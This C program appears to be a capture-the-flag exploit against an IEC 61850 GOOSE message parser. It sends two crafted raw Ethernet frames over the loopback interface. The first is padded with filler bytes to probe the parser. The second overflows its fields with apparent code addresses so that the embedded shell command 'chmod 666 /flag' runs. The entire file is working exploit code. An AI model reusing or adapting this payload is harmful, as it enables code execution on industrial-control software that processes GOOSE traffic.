#include <arpa/inet.h>
#include <errno.h>
#include <net/if.h>
#include <netinet/ether.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>
#include <stdint.h>
#include <linux/if_packet.h>

uint8_t buf1[] = {0x1, 0xc, 0xcd, 0x1, 0x0, 0x1, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x88, 0xb8, 0x3, 0xe8, 0x0, 0x79, 0x0, 0x0, 0x0, 0x0, 0x61, 0x84, 0x0, 0x0, 0x0, 0x35, 0x80, 0x84, 0x0, 0x0, 0x0, 0x29, 0x73, 0x69, 0x6d, 0x70, 0x6c, 0x65, 0x49, 0x4f, 0x47, 0x65, 0x6e, 0x65, 0x72, 0x69, 0x63, 0x49, 0x4f, 0x2f, 0x4c, 0x4c, 0x4e, 0x30, 0x24, 0x47, 0x4f, 0x24, 0x67, 0x63, 0x62, 0x41, 0x6e, 0x61, 0x6c, 0x6f, 0x67, 0x56, 0x61, 0x6c, 0x75, 0x65, 0x73, 0xab, 0x84, 0x0, 0x0, 0x0, 0x36, 0x84, 0x84, 0x0, 0x0, 0x0, 0x19, 0x0, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x84, 0x84, 0x0, 0x0, 0x0, 0x11, 0x0, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42};

uint8_t buf2[] = {0x1, 0xc, 0xcd, 0x1, 0x0, 0x1, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x88, 0xb8, 0x3, 0xe8, 0x0, 0x98, 0x0, 0x0, 0x0, 0x0, 0x61, 0x84, 0x0, 0x0, 0x0, 0x35, 0x80, 0x84, 0x0, 0x0, 0x0, 0x29, 0x73, 0x69, 0x6d, 0x70, 0x6c, 0x65, 0x49, 0x4f, 0x47, 0x65, 0x6e, 0x65, 0x72, 0x69, 0x63, 0x49, 0x4f, 0x2f, 0x4c, 0x4c, 0x4e, 0x30, 0x24, 0x47, 0x4f, 0x24, 0x67, 0x63, 0x62, 0x41, 0x6e, 0x61, 0x6c, 0x6f, 0x67, 0x56, 0x61, 0x6c, 0x75, 0x65, 0x73, 0xab, 0x84, 0x0, 0x0, 0x0, 0x55, 0x84, 0x84, 0x0, 0x0, 0x0, 0x38, 0xf8, 0x63, 0x68, 0x6d, 0x6f, 0x64, 0x20, 0x36, 0x36, 0x36, 0x20, 0x2f, 0x66, 0x6c, 0x61, 0x67, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x25, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3, 0x0, 0x0, 0x0, 0x0, 0x80, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf0, 0x30, 0x41, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x84, 0x84, 0x0, 0x0, 0x0, 0x11, 0x0, 0xe0, 0x10, 0x40, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf0, 0x11, 0x40, 0x0, 0x0, 0x0, 0x0, 0x0};

int main(void) {
    struct ifreq ifr;
    struct sockaddr_ll sa;

    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));

    if (sock < 0) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, "lo", sizeof(ifr.ifr_name) -1);
    if (ioctl(sock, SIOCGIFINDEX, &ifr) == -1) {
        perror("ioctl");
        exit(EXIT_FAILURE);
                             
    }

    memset(&sa, 0, sizeof(sa));
    sa.sll_family = AF_PACKET;
    sa.sll_protocol = htons(ETH_P_ALL);
    sa.sll_ifindex = ifr.ifr_ifindex;

    if (sendto(sock, buf1, sizeof(buf1), 0, (struct sockaddr *)&sa, sizeof(sa)) == -1) {
        perror("sendto");
        exit(EXIT_FAILURE);
    }

    if (sendto(sock, buf2, sizeof(buf2), 0, (struct sockaddr *)&sa, sizeof(sa)) == -1) {
        perror("sendto");
        exit(EXIT_FAILURE);
    }

    close(sock);
}
